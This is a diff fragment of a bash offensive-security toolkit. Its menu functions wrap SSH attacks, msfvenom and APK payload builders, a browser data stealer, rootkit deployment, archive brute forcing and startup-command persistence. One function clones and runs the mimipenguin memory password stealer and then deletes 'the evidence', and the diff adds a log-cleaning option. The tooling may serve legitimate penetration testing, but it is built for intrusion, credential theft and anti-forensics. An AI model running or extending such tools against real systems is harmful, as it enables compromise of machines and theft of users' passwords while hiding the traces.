     export CSTK_MAIN_RUNNER=1
     "$cstk_wrapper" "$ssh_attack_bin"
     if [[ "$comeback" = 1 ]]; then
@@ -1253,7 +1075,7 @@ ssh_attack() {
 # Class: PAYLOADS - Tool: metasploit (msfvenom) shell creater - Option 9 (Wrapper used)
 msf_payloads() {
     payloads_msf_frame
-    sleep 3
+    sleep 5
     getip
     export CSTK_MAIN_RUNNER=1
     "$cstk_wrapper" "$msfvenom_bin"
@@ -1265,7 +1087,7 @@ apk_killer() {
     clear
     A="$ap APK Builder ==> ${x}"
     payloads_apk_frame
-    sleep 3
+    sleep 5
     export CSTK_MAIN_RUNNER=1
     echo -e "\nChoose connection type:\n1) Meterpreter\n2) Shell\n"
     read -r -n 1 -p "${c} ${A} ${x}" con
@@ -1361,7 +1183,7 @@ check_vm() {
 browser_data_wrapper() {
     clear
     postx_browserthief_frame
-    sleep 3
+    sleep 5
     export CSTK_MAIN_RUNNER=1
     "$cstk_wrapper" "$browser_stealer_bin"
     wait_and_return
@@ -1482,7 +1304,7 @@ crypto_catch() {
 check_gtfob() {
     clear
     postx_filex_frame
-    sleep 3
+    sleep 5
     # Ensure GTFOB.py is available
     if ! command -v python3 &> /dev/null || [ ! -f "$GTFOB" ]; then
     echo -e "$r \nPython3 not found. Script failed to run $x"
@@ -1535,7 +1357,7 @@ linux_exploits_check() {
     trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
     clear
     postx_kernalx_frame
-    sleep 3
+    sleep 5
     echo -e "\nWould you like to check for: \n1 - kernel vulnabilities \n2 - userland vulnabilites \n3 - both 1 and 2 \n4 - exit to main menu \n"
     read -r -n 1 -p "${c} ${A} ${x}" rk
     [[ "$rk" -ge 4 ]] && wait_and_return
@@ -1619,7 +1441,7 @@ startup_command() {
     A="$ax Command On Start ==> ${x}"
     clear
     postx_onstart_frame
-    sleep 3
+    sleep 5
     LOOT_FILE="$Loot/embed_command_on_start.txt"
     exec > >(tee -a "$LOOT_FILE") 2>&1
     echo -e "$g \nEnter command to run at startup $x"
@@ -1639,7 +1461,7 @@ brute_force_file() {
     A="$ae Archive Brute Forcer ==> ${x}"
     clear
     postx_bruteforce_frame
-    sleep 3
+    sleep 5
     echo -e "$c \nEnter the path and filename of the password file to use. $b\nExample: $r /usr/share/Seclist/passwords/rockyou.txt $x"
     read -e -r -p "${c} ${A} ${x}" dictionary
     echo -e "$y \nSpecify the full path and filename of the 7z, zip, or rar archive to bruteforce. $x"
@@ -1728,7 +1550,7 @@ files_of_interest() {
 deploy_rootkit() {
     A="$ax Rootkit ==> ${x}"
     postx_rootkit_frame
-    sleep 3
+    sleep 5
     export CSTK_MAIN_RUNNER=1
 
     readme_userland() {
@@ -1774,17 +1596,17 @@ deploy_rootkit() {
 }
 
 inmem_password_stealer() {
-    A="$ax Memory Password Stealer ==> ${x}"
+    A="$ax Mem-Passwd-Stealer ==> ${x}"
     postx_inmem_frame
-    sleep 3
+    sleep 5
     cwd="$PWD"
-    git clone https://github.com/huntergregal/mimipenguin.git
-    cd mimipenguin
-    make
+    git clone https://github.com/huntergregal/mimipenguin.git &>/dev/null
+    cd mimipenguin &>/dev/null
+    make &>/dev/null
     ./mimipenguin
     read -p "${A} Press Enter/Return when ready to delete the evidence"
-    cd "$cwd"
-    rm -rf mimipenguin
+    cd "$cwd" &>/dev/null
+    rm -rf mimipenguin &>/dev/null
     wait_and_return
 }
 
@@ -1888,7 +1710,7 @@ extract_arch() {
 r_b_g_wrapper() {
     clear
     etc_openssl_frame
-    sleep 3
+    sleep 5
     export CSTK_MAIN_RUNNER=1
     "$cstk_wrapper" "$openssl_helper_bin"
     wait_and_return
@@ -1898,7 +1720,7 @@ r_b_g_wrapper() {
 gpg_lookalike_wrapper() {
     clear
     etc_secret_frame
-    sleep 3
+    sleep 5
     export CSTK_MAIN_RUNNER=1
     "$cstk_wrapper" "$gpg_help_bin"
     wait_and_return
@@ -1926,13 +1748,6 @@ create_exe_binary() {
         echo -e "$r \nError in trying to copy $bash_script $x"
         exit 15
     fi
-    #bash-obfuscate "/tmp/$script_name" -o "/tmp/$script_name.temp" || {
-    #    echo -e "$r \nError obfuscating the script $x"
-    #    exit 16
-    #{
-    #    echo '#!/bin/bash'
-    #    cat "/tmp/$script_name.temp"
-    #} > "/tmp/$script_name.temp2"
     shc -r -f "/tmp/$script_name" -o "$new_script_name" || { echo -e "$r \nError compiling the script to binary $x" ; exit 17 ; }
     chmod 755 "$new_script_name"
     rm -rf "/tmp/$script_name.*"
@@ -1941,7 +1756,7 @@ create_exe_binary() {
 }
 
 # Class: ETC - Tool: Post exploit tools to go - Option 7
-past_x_2_go() {
+post_x_2_go() {
     A="$ae Post Exploit 2 GO ==> ${x}"
     file="$zip2go"
     trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
@@ -1953,7 +1768,7 @@ past_x_2_go() {
         openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$zip2go_enc" -out "$zip2go" -pass pass:"$pswd"
         echo "zip file is located in the $Malware folder"
     else
-        class_menu
+        error_font
     fi
     wait_and_return
 }
@@ -2016,27 +1831,27 @@ EOF
     echo -e "\n\e[35mScript is located at: $Malware/$name\e[0m"
     wait_and_return
 }
+
+log_cleaning_tool() {
+    clear
+    export CSTK_MAIN_RUNNER=1
+    "$cstk_wrapper" "$log_clean_bin"
+    wait_and_return
+}
+
 ######################## MAIN SCRIPT #######################
 check_root
 # Check for any arguements and display the correct information
 # Script needs 2 arguements to run
 # If no arguemets then start in GUI mode
-if [[ $# -eq 0 ]]; then
+
+
+if [[ $# -ne 2 ]]; then
+    if [[ $# -eq 1 ]] && [[ $1 =~ [-h|-H|-help|-HELP] ]]; then
+        show_help
+    fi
     header
     main_menu
-elif [[ $# -eq 1 ]]; then
-# If only 1 arguement supplied then user may be asking for help
-	case $1 in
-		-h| -H| --help) open_help_file ;;
-		-c| -C| --class) open_class_help ;;
-		-t| -T| --tool) open_tool_help ;;
-        -s| -S| --skip) main_menu ;;
-		*) show_help && exit 18 ;;
-	 esac
-elif [[ $# -ge 3 ]]; then
-# If user has 3 + arguemets they need the help menu 
-	show_help
-	exit 18
 fi
 # Parse the first argument (class)
 case $1 in
@@ -2044,7 +1859,7 @@ case $1 in
     -p| -P| --payload) class="payload" ;;
     -x| -X| --postex) class="postex" ;;
     -e| -E| --etc) class="etc" ;;
-    *) echo -e "Unknown class option: $1"; show_help; exit 18 ;;
+    *) show_help ;;
 esac
 # Parse the second argument (program) and execute the appropriate function
 case $class in
@@ -2058,7 +1873,8 @@ case $class in
         	    gd|google-dorks|google_dorks) google_dorks ;;
         	    email|email_search|email-search) email_search ;;
         	    pa|pass-atk|pass_atk|password_attack|password-attack) pass_attack ;;
-        	    *) echo -e "Unknown OSINT program: $2"; show_help; exit 18 ;;
+        	    vf|vuln-finder|vln_finder) vuln_searcher ;;
+        	    *) show_help ;;
         	esac
         	;;
 	payload)
@@ -2073,7 +1889,7 @@ case $class in
 		    	ssh|ssh_attack|ssh-attack) ssh_attack ;;
 		    	msf|venom|metasploit) msf_payloads ;;
 		    	apk|apk_builder|apk-builder) apk_killer ;;
-        	    *) echo -e "Unknown Payload program: $2"; show_help; exit 18 ;;
+        	    *) show_help ;;
         	esac
         	;;
 	postex)
@@ -2088,7 +1904,7 @@ case $class in
         	    files_of_interest|files-of-interest|foi) files_of_interest ;;
 				drk|deploy-rootkit|deploy_rootkit) deploy_rootkit ;;
 				mem|inmem|in-memory|in_memory) inmem_password_stealer ;; 
-        	    *) echo -e "Unknown Post Exploitation program: $2"; show_help; exit 18 ;;
+        	    *) show_help ;;
         	esac
         	;;
 	etc)
@@ -2101,10 +1917,11 @@ case $class in
 		    	binary|create-binary|create_binary) create_exe_binary ;;
 		    	postx2go|post-x-2-go|post_x_2_go) post_x_2_go ;;
 		    	array|array-enc-script|array_enc_script) array_enc_script ;;
-        	    *) echo -e "Unknown Etc program: $2"; show_help; exit 18 ;;
+		    	lc|log-cleaner|log_cleaner) log_cleaning_tool ;;
+        	    *) show_help ;;
         	esac
         	;;
-    *) echo -e "Invalid class"; show_help; exit 18 ;;
+    *) show_help ;;
 esac
 
 exit
